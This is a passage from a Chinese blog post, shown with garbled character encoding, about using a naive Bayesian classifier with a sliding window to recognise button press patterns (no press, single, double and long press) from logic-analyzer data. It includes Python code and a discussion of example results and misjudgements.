&nbsp;&nbsp;&nbsp;&nbsp;filename&nbsp;=&nbsp;"key_data_20s_all.csv"&nbsp;&nbsp;#&nbsp;é»è¾åæä»ªå¯¼åºçæ°æ®

&nbsp;&nbsp;&nbsp;&nbsp;recognizer&nbsp;=&nbsp;BayesianButtonRecognizer(window_size=100,&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;threshold=0.8)

&nbsp;&nbsp;&nbsp;&nbsp;recognizer.reset()

&nbsp;&nbsp;&nbsp;&nbsp;time_data,&nbsp;signal_data&nbsp;=&nbsp;read_sigrok_csv_simple(filename)

&nbsp;&nbsp;&nbsp;&nbsp;print(f"æåè¯»åæ°æ®ï¼å±&nbsp;{len(time_data)}&nbsp;ä¸ªæ°æ®ç¹")

&nbsp;&nbsp;&nbsp;&nbsp;print(f"æ¶é´èå´:&nbsp;{time_data[0]}s&nbsp;å°&nbsp;{time_data[-1]}s")

&nbsp;&nbsp;&nbsp;&nbsp;plt.figure(1)

&nbsp;&nbsp;&nbsp;&nbsp;sample_data&nbsp;=&nbsp;[]

&nbsp;&nbsp;&nbsp;&nbsp;res_data&nbsp;=&nbsp;[]

&nbsp;&nbsp;&nbsp;&nbsp;sample_num&nbsp;=&nbsp;math.floor(len(signal_data)&nbsp;/&nbsp;SampleInterval)

&nbsp;&nbsp;&nbsp;&nbsp;print("sample&nbsp;size&nbsp;is:",sample_num)

&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(sample_num-1):

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sample_data.append(int(not&nbsp;signal_data[SampleInterval*i]))

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;recognizer.slide_window(int(not&nbsp;signal_data

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[SampleInterval*i]))

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;i%recognizer.window_size==0:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res,postrior=recognizer.update_belief(i)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(res&nbsp;not&nbsp;in["ä¸ç¡®å®","æ æ"]):

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res_data.append(res)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print("win[%d]:"%i,res)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;plt.plot(recognizer.window)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;plt.show()

&nbsp;&nbsp;&nbsp;&nbsp;plt.figure(1)

&nbsp;&nbsp;&nbsp;&nbsp;plt.plot(sample_data)

&nbsp;&nbsp;&nbsp;&nbsp;plt.show()

&nbsp;&nbsp;&nbsp;&nbsp;print(res_data)
</code></pre>
<p>å½çªå£ä¸­æ ·æ¬åºåæ¯çæ³æåµæ¶ï¼è¯å«ææç¸å½å¥½ï¼</p>
<p>æ ææ ·æ¬ç¤ºä¾ï¼</p>
<p><img alt="" loading="lazy" data-src="https://fastly.jsdelivr.net/gh/bucketio/img16@main/2026/02/17/1771293783552-374386fd-51ad-4ecc-90cb-c38b2aa5a203.png" class="lazyload"></p>
<p>ä¸å¾æ¯ä¸ä¸ªæ ææé®æ ·æ¬åºåå¾ï¼ä¿ææ æçµå¹³ï¼æ²¡æè¾¹æ²¿ååãä¸å¾ç»åºäºè¯å«çè¿ç¨åç»æï¼</p>
<p><img alt="" loading="lazy" data-src="https://fastly.jsdelivr.net/gh/bucketio/img13@main/2026/02/17/1771293803151-94e9e91f-21ff-4ccc-995a-e4dee84ed04b.png" class="lazyload"></p>
<p>å¯ä»¥çå°ç¹å¾æåçä¿¡æ¯æ¯æ­£ç¡®çï¼é«çµå¹³å æ¯ä¸º0ï¼è¾¹æ²¿è®¡æ°ä¸º0ï¼æé¿é«çµå¹³å»¶æ¶ä¸º0ï¼å¨åä¸ªæ¨¡å¼çä¼¼ç¶åè¡¨ä¸­ï¼ç»åºäºå¯¹åºçä¼¼ç¶ç»æï¼åæ¶ä»åæ°æ®å¯¹æ¯æ¥çï¼ä¹å¯ä»¥ç´æ¥ä»æ°å¼ä¸çåºæ ·æ¬ç¹å¾æ´åååªä¸ªæ¨¡å¼ï¼æç»çåéªç»æï¼ç¡®å®æ¯æ ææ¨¡å¼çæ¦çæé«ï¼å³å¤å®çªå£ä¸­çåºåä¸ºæ æã</p>
<p>åå»æ ·æ¬ç¤ºä¾ï¼</p>
<p><img alt="" loading="lazy" data-src="https://fastly.jsdelivr.net/gh/bucketio/img12@main/2026/02/17/1771293891198-b35c3126-6cdb-4e0c-aa8d-866bb50f0abb.png" class="lazyload"></p>
<p>ä¸å¾æ¯ä¸ä¸ªåå»æé®æ ·æ¬åºåå¾ï¼æè¾¹æ²¿ååï¼ä¸ä¸ªä¸åæ²¿ï¼ä¸ä¸ªä¸éæ²¿ï¼é«çµå¹³å æ¯å¤§çº¦0.2ãä¸å¾ç»åºäºè¯å«çè¿ç¨åç»æï¼</p>
<p><img alt="" loading="lazy" data-src="https://fastly.jsdelivr.net/gh/bucketio/img18@main/2026/02/17/1771293913887-243f48a3-b10e-4539-a556-b64928912fe1.png" class="lazyload"></p>
<p>å¯ä»¥çå°ç¹å¾æåçä¿¡æ¯æ¯æ­£ç¡®çï¼æç»çè¯å«ç»æä¹æ¯æ­£ç¡®ç</p>
<p>åå»æ ·æ¬ç¤ºä¾ï¼</p>
<p><img alt="" loading="lazy" data-src="https://fastly.jsdelivr.net/gh/bucketio/img1@main/2026/02/17/1771293929485-ba56eac4-b956-455e-91a9-60a337f17f6d.png" class="lazyload"></p>
<p>ä¸å¾æ¯ä¸ä¸ªåå»æ ·æ¬çç¤ºä¾å¾ï¼å¯ä»¥çå°ç±ä¸¤ä¸ªé«çµå¹³ç»æï¼ä¸å¾ç»åºè¯å«è¿ç¨åç»æï¼</p>
<p><img alt="" loading="lazy" data-src="https://fastly.jsdelivr.net/gh/bucketio/img1@main/2026/02/17/1771293960527-ad7cc398-d923-41ef-8d6f-ad712670b32d.png" class="lazyload"></p>
<p>å¯ä»¥çåºç¹å¾æåä¿¡æ¯æ­£ç¡®ï¼æä¸¤ä¸ªä¸åæ²¿åä¸¤ä¸ªä¸éæ²¿ï¼ç¶åæç»çåéªæ¦çä¸­ä¹æ¯åå»çæ¦çæå¤§ï¼å¹¶ä¸è¶è¿éå¼å¤å®æ­£ç¡®ã</p>
<p>ä¸é¢ç»åºä¸äºå ä¸ºä¿¡å·å®æ´æ§ç¼ºå¤±é æçè¯¯å¤ç¤ºä¾ã</p>
<p>è¾¹çåå»æåµç¤ºä¾ï¼</p>
<p><img alt="" loading="lazy" data-src="https://fastly.jsdelivr.net/gh/bucketio/img16@main/2026/02/17/1771293978238-9f37d07c-3bc9-4da7-9aa1-b1e750afd69f.png" class="lazyload"></p>
<p>ä¸å¾ä¸­å¯ä»¥çåºå¾ææ¾æ¯ä¸ä¸ªåå»çå¨ä½ï¼ä½æ¯ç±äºçªå£é¿åº¦åºå®çåå ï¼å¯¼è´ä¸é¨ååºåç¼ºå¤±ï¼ä¸å¾ç»åºè¯å«ç»æï¼</p>
<p><img alt="" loading="lazy" data-src="https://fastly.jsdelivr.net/gh/bucketio/img13@main/2026/02/17/1771293991565-251bfdcd-4f0c-4384-bad2-ec45caef56a4.png" class="lazyload"></p>
<p>ç¹å¾æåçä¿¡æ¯åæ¯æ­£ç¡®çï¼è¯å«åºä¸éæ²¿åªæ1ä¸ªï¼å¨è®¡ç®ä¼¼ç¶è¿ç¨ä¸­ï¼ç¸åºä½ç½®çä¼¼ç¶ç»æä¹ååºäºè¿ä¸ç¹ï¼æç»çåéªè¡¨ä¸­å¯ä»¥çå°åä¸¤ä¸ªå¤§çæ¦çæ¯åå»ååå»ï¼ä½æ¯é½æ²¡è¶è¿éå¼ï¼æä»¥å¤å®ä¸ºä¸ç¡®å®</p>
<p>è¾¹çåå»æåµç¤ºä¾ï¼</p>
<p><img alt="" loading="lazy" data-src="https://fastly.jsdelivr.net/gh/bucketio/img11@main/2026/02/17/1771294007027-42bf15d6-a5f4-439c-9b7e-9373e29bb1e6.png" class="lazyload"></p>
<p>å¯ä»¥çåºè¿ä¸ªæåµåæ¯åå»ï¼ä½æ¯å®éä¸æ¯ä¸æ®µé¿æåºåï¼ä¸å¾ç»åºè¯å«è¿ç¨ï¼</p>
<p><img alt="" loading="lazy" data-src="https://fastly.jsdelivr.net/gh/bucketio/img11@main/2026/02/17/1771294043631-9760e86e-65e2-4318-ba9a-a81f8662083f.png" class="lazyload"></p>
<p>ç¹å¾ä¿¡æ¯æåæ¯æ­£ç¡®çï¼ç¶åä¼¼ç¶ç»æé½åä½ï¼è¡¨ç¤ºä¸ååæä¸ä¸ªæ¨¡å¼ï¼ä½å¨æç»çåéªç»æä¸­åå»çåéªæ¦çå¼å¸¸çé«ï¼åºè¯¥æ¯å¨å½ä¸åè¿ç¨ä¸­ï¼åå»æ¦çå æ¯æ¯å¶ä»æ¦çå¤§å¾å¤å¯¼è´çï¼è¿ä¹æ¯åæ ·çé®é¢ï¼ä¹å°±æ¯ä¿¡å·å®æ´æ§ç¼ºå¤±å¯¼è´äºè¯¯å¤</p>
<h2 id="æ»ç»">æ»ç»</h2>
<p>å¨è¿æ¬¡å®éªä¸­ï¼åºäºæ´ç´ è´å¶æ¯åç±»æ¹æ³ï¼éè¿<em>æ»å¨çªå£</em>ééæ°æ®ãæåå¤ç»´åº¦ç¹å¾ãè®¡ç®æ¦çåå¸ååºç¨è´å¶æ¯æ´æ°ï¼å­¦å°äºä¸å°ï¼ä¹èåäºå¾å¤åå®¹ï¼ç®æ¯ä¸æ¬¡ä¸å°çå­¦ä¹ ä½éªå§ï¼è½ç¶ç®åæµè¯ä¸æ¥æææéï¼è¿æ æ³çæ­£ç¨å¨é¡¹ç®ä¸­ï¼ä¹æ»ç»äºä¸äºä¸è¶³çå°æ¹ã</p>
<p>æ¯å¦ä¿¡å·å®æ´æ§ä¿è¯ä¸äºï¼ä¸åç¹å¾å±æ§å¯¹ä¸åæ¨¡å¼çæéå®éå¹¶ä¸ä¸è´ç­ï¼è¿äºé½æ¯éè¦è§£å³çé®é¢ï¼è½ç¶å¯¹ç°å¨çææ¥è¯´å¾å°é¾ï¼ä½æ¢ç´¢æ°æ¹æ³çè¿ç¨è¿æ¯è®åæ¬¢çï¼ä¹å¯è½æ¯å¯¹ç°ææ¹æ³çå®¡ç¾ç²å³å¯¼è´çå§ã</p>
<p>ä½æä¸è¯´ä¸ï¼ä¼ ç»çæ¹æ³ï¼è¿æ¯ç®åé«æçï¼ä¹ä¸æ¶åå°ä»ä¹æ°å­¦çåå®¹ï¼å¨å­é»è¾å å¤æ­å°±å¯ä»¥æå®äºï¼çæ¯çæ¶çååã</p>


</div>
<div id="MySignature" role="contentinfo">
    <p>æ¬ææ¥èªåå®¢å­ï¼ä½èï¼<a href="https://www.cnblogs.com/pie-o/" target="_blank">pie_thn</a>ï¼è½¬è½½è¯·æ³¨æåæé¾æ¥ï¼<a href="https://www.cnblogs.com/pie-o/p/19622890" target="_blank">https://www.cnblogs.com/pie-o/p/19622890</a></p>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-18 10:39">2026-02-18 10:38</span>&nbsp;
<a href="https://www.cnblogs.com/pie-o">pie_thn</a>&nbsp;
éè¯»(<span id="post_view_count">61</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19622890);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19622890', targetLink: 'https://www.cnblogs.com/pie-o/p/19622890', title: 'è¿ä¹è¡ï¼æé®å¨ä½æ¨¡å¼è¯å«ä¹è½ç¨è´å¶æ¯ï¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
        </channel>
        </rss>